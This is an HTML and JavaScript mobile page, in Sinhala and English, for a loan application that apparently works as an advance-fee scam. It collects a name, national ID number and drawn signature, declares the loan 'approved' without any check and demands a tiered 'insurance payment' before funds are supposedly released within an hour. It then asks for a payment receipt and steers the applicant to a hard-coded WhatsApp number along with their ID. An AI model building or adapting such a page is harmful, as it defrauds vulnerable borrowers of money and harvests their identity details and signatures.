<!DOCTYPE html>
<html lang="si">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>EzC Signature App</title>

<style>
*{box-sizing:border-box;}

body{
    margin:0;
    font-family:system-ui, Arial;
    background:#eaeef3;
}

.app{
    max-width:420px;
    margin:auto;
    min-height:100vh;
    background:#fff;
}

.page{padding:16px;}
h3{text-align:center;}

label{
    display:block;
    margin-top:14px;
    font-weight:600;
}

input{
    width:100%;
    padding:14px;
    margin-top:6px;
    border-radius:12px;
    border:1px solid #ccc;
    font-size:16px;
}

button{
    width:100%;
    padding:14px;
    margin-top:14px;
    border:none;
    border-radius:14px;
    font-size:16px;
    color:#fff;
    background:#27ae60;
}

.clear-btn{background:#e74c3c;}
.pay-btn{background:#2980b9;}
.whatsapp-btn{background:#25D366;}

canvas{
    width:100%;
    height:160px;
    border:2px dashed #aaa;
    border-radius:12px;
    margin-top:8px;
    touch-action:none;
}

.statement{
    margin-top:12px;
    padding:12px;
    background:#f4f6f8;
    border-radius:12px;
    font-size:14px;
    line-height:1.5;
}

#loading{
    position:fixed;
    inset:0;
    background:rgba(255,255,255,.95);
    display:none;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    z-index:999;
}

.spinner{
    width:48px;
    height:48px;
    border:5px solid #6dd5fa;
    border-top:5px solid #27ae60;
    border-radius:50%;
    animation:spin 1s linear infinite;
    margin-bottom:20px;
}

@keyframes spin{100%{transform:rotate(360deg);}}

#page2{display:none;}

#popup{
    position:fixed;
    inset:0;
    background:rgba(0,0,0,.4);
    display:flex;
    align-items:center;
    justify-content:center;
    opacity:0;
    pointer-events:none;
    transition:.25s;
    z-index:1000;
}

#popup.active{
    opacity:1;
    pointer-events:auto;
}

.popup-box{
    background:#fff;
    padding:20px;
    width:85%;
    max-width:320px;
    border-radius:14px;
    text-align:center;
}
</style>
</head>

<body>
<div class="app">

<!-- PAGE 1 -->
<div class="page" id="page1">
<h3>Customer Details</h3>

<label>Name</label>
<input id="name">

<label>NIC</label>
<input id="nic">

<label>Amount (Rs)</label>
<input type="number" id="amount">

<div class="statement">
මා විසින් ලබාගන්නා මෙම මුදල, ඉහත ලේඛනයේ සඳහන් පොලී අනුපාතයන්ට එකඟව මුදල් ගෙවන බවට මෙයින් පොරොන්දු වෙමි.
</div>

<label>Signature</label>
<canvas id="sign"></canvas>
<button class="clear-btn" onclick="clearSign()">Clear Signature</button>

<button onclick="goNext()">Next</button>
</div>

<!-- PAGE 2 -->
<div class="page" id="page2">
<h3>Loan Approved</h3>

<p><b>Requested Amount:</b> Rs. <span id="showAmount"></span></p>
<p><b>Insurance Payment:</b> Rs. <span id="insurance"></span></p>

<div class="statement">
ඔබ ලබාගන්නා ණය මුදල අනුමත වී ඇත.<br><br>
රක්ෂණ මුදල ගෙවා පැයක් ඇතුළත මුදල් බැර කෙරේ.<br><br>
රිසිට් පත WhatsApp හරහා එවනු ලැබේ.
</div>

<label>Upload Receipt</label>
<input type="file" id="receipt" accept="image/*">

<button onclick="submitForm()">Submit</button>

<button class="pay-btn" onclick="window.open(PAY_LINK,'_blank')">ගෙව්ම කරන ආකාරය/Pay Now</button>

<button class="whatsapp-btn" id="whatsappBtn">මේ පිළිබඳ විස්තර WhatsApp Message</button>
</div>
</div>

<!-- POPUP -->
<div id="popup">
<div class="popup-box">
<div id="popupText"></div>
<button onclick="popup.classList.remove('active')">OK</button>
</div>
</div>

<script>
const PAY_LINK="https://example.com/pay";
const WHATSAPP_NO="94742089009";

/* POPUP */
function showPopup(msg){
 popupText.innerText=msg;
 popup.classList.add("active");
}

/* INSURANCE */
function calculateInsurance(amount){
 amount=parseInt(amount);
 if(amount<=30000) return 2000;
 if(amount<=40000) return 2500;
 if(amount<=50000) return 3000;
 if(amount<=100000) return 3500;
 if(amount<=200000) return 4000;
 if(amount<=300000) return 4000;
 if(amount<=400000) return 5000;
 return 5500;
}

/* SIGNATURE */
const c=document.getElementById("sign");
const ctx=c.getContext("2d");
ctx.lineWidth=3;
ctx.lineCap="round";

function resizeCanvas(){
    const r=window.devicePixelRatio||1;
    c.width=c.offsetWidth*r;
    c.height=c.offsetHeight*r;
    ctx.setTransform(r,0,0,r,0,0);
}
resizeCanvas();

let drawing=false;
c.addEventListener("pointerdown",e=>{
    drawing=true;
    ctx.beginPath();
    ctx.moveTo(e.offsetX,e.offsetY);
});
c.addEventListener("pointermove",e=>{
    if(!drawing)return;
    ctx.lineTo(e.offsetX,e.offsetY);
    ctx.stroke();
});
c.addEventListener("pointerup",()=>drawing=false);
c.addEventListener("pointerleave",()=>drawing=false);

function clearSign(){ctx.clearRect(0,0,c.width,c.height);}

/* PAGE FLOW */
function goNext(){
    const nameEl=document.getElementById("name");
    const nicEl=document.getElementById("nic");
    const amountEl=document.getElementById("amount");

    const name=nameEl.value.trim();
    const nicVal=nicEl.value.trim();
    const amountVal=amountEl.value;

    if(!name || !nicVal || !amountVal){
        showPopup("කරුණාකර සියලු fields පුරවන්න");
        return;
    }

    document.getElementById("showAmount").innerText=amountVal;
    document.getElementById("insurance").innerText=calculateInsurance(amountVal);

    const page1=document.getElementById("page1");
    const page2=document.getElementById("page2");

    page1.style.display="none";
    page2.style.display="block";
}

/* SUBMIT FORM */
function submitForm(){
    const receipt=document.getElementById("receipt");
    if(receipt.files.length===0){
        showPopup("කරුණාකර receipt upload කරන්න");
        return;
    }

    showPopup("Receipt uploaded successfully. දැන් WhatsApp click කරන්න.");
}

/* WHATSAPP */
function sendWhatsApp(){
    const nicVal=document.getElementById("nic").value.trim();
    const insuranceVal=document.getElementById("insurance").innerText;

    const msg=`විස්තර ඒවා ඇත ✅
Customer ID: ${nicVal}
Insurance Amount: Rs.${insuranceVal}
Time: ${new Date().toLocaleString()}
මේ පිළිබඳ විස්තරයක් මට දැනුම් දෙන්න`;

    const url=`https://wa.me/${WHATSAPP_NO}?text=${encodeURIComponent(msg)}`;
    window.open(url,"_blank");
}

document.getElementById("whatsappBtn").onclick=sendWhatsApp;
</script>
</body>
</html>
